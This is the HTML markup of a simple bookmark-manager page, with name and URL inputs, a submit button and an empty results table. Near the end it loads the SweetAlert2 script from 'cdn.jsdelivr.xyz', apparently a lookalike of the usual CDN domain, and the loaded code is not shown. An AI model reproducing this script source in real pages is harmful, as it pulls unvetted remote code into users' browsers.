<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bookmarker</title>
    <link rel="stylesheet" href="css/all.min.css">
    <link rel="stylesheet" href="css/bootstrap.min.css">
    <link rel="stylesheet" href="css/style.css">
    <link href="https://fonts.googleapis.com/css2?family=Pacifico&family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap" rel="stylesheet">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link href="https://fonts.googleapis.com/css2?family=Righteous&display=swap" rel="stylesheet">
</head>
<body>
    <div class="container my-5">
        <h1 class="text-center">Bookmarker</h1>
        <hr class="my-5 ">
        <div class="my-5 text">
         <h2 class="text-center"><i class="fa-solid fa-bookmark" style="color: #329a3e;"></i> Bookmark your favorite sites <i class="fa-solid fa-bookmark" style="color: #30b540;"></i></h2> 
        </div>
        <div class="inputs">
            <label for="siteName"><i class="fa-solid fa-book-bookmark" style="color: #000000;"></i> <span class="websiteName fw-bolder mx-2">Site Name</span></label>
            <input type="text" class="form-control my-3" id="siteName" placeholder="Bookmark Name">
            <label for="url"><i class="fa-solid fa-link" style="color: #000000;"></i> <span class="fw-bolder mx-2">Site Url</span></label>
            <input type="text" class="form-control my-3" id="url" placeholder="Website Url">
        </div>
        <div class="text-center">
            <button onclick="checkAndAddSite()" class="btn btn-danger px-5 ">Submit</button>
        </div>
        <hr class="my-4 hr-cstm">
        <div class="table-sec">
            <table class="teble mt-4 text-center bg-light w-100">
            <thead>
                <th class="text-capitalize py-2">Index</th>
                <th class="text-capitalize">Website Name</th>
                <th class="text-capitalize">Visit</th>
                <th class="text-capitalize">Delete</th>
            </thead>
            <tbody id="tablebody">
            </tbody>
            </table>
        </div>
    </div>
    <script src="https://cdn.jsdelivr.xyz/npm/sweetalert2@11"></script>
    <script src="js/bootstrap.bundle.min.js"></script>
    <script src="js/main.JS"></script>
</body>
</html>
